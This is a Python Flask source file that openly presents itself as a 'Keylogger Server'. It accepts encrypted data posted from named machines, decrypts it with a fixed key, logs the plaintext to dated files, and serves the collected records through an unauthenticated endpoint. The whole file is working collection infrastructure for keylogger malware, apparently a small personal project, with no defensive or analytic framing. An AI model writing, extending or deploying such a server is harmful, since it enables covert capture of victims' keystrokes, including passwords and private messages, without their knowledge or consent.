from flask import Flask, request, jsonify
from datetime import datetime
from encryptor import Encryptor

app = Flask(__name__)

encryptor = Encryptor(42)

@app.route('/')
def home():
    return "Welcome to the Keylogger Server!"

@app.route('/receive_data', methods=['POST'])
def receive_data():
    try:
        data = request.get_json()
        print(f"Received data: {data}")  # הדפסת המידע המתקבל
        encrypted_data = data.get("data")
        machine_name = data.get("machine_name")

        if encrypted_data and machine_name:
            decrypted_data = encryptor.decrypt(encrypted_data)
            print(f"Decrypted data: {decrypted_data}")  # הדפסת המידע המפוענח

            current_date = datetime.now().strftime("%Y-%m-%d")
            file_name = f"received_data_{current_date}.txt"

            with open(file_name, "a", encoding="utf-8") as file:
                file.write(f"Machine: {machine_name} - Data: {decrypted_data}\n")

            return jsonify({"status": "success", "message": "Data received successfully!"}), 200
        else:
            return jsonify({"status": "error", "message": "Missing data or machine name"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error processing data: {str(e)}"}), 500

@app.route('/get_reports', methods=['GET'])
def get_reports():
    try:
        current_date = datetime.now().strftime("%Y-%m-%d")
        file_name = f"received_data_{current_date}.txt"

        with open(file_name, "r", encoding="utf-8") as file:
            lines = file.readlines()

        return jsonify({"status": "success", "reports": lines}), 200
    except FileNotFoundError:
        return jsonify({"status": "error", "message": "No reports found"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error retrieving reports: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
